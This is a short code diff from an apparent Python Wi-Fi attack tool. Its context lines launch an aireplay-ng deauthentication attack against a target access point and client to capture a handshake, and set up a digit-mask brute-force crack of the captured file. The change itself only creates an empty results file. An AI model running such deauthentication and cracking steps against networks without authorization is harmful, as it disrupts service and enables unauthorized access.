@@ -1779,6 +1779,8 @@ def capture_handshake():
     subprocess.Popen(['gnome-terminal', '-e', 'bash -c "aireplay-ng -0 {} -a {} -c {} {}; exec bash"'.format(chid,bssid,station,interface)])
     
 def crack_password():
+    result = open("result.txt",'w')
+    result.close()
     file_name = input("Enter the name desired .cap file (eg. if the .cap file name is dump-01.cap, please enter dump-01) : ")
     digits = int(input("Enter the number of digits of the password: "))
     digit = "?d"*digits
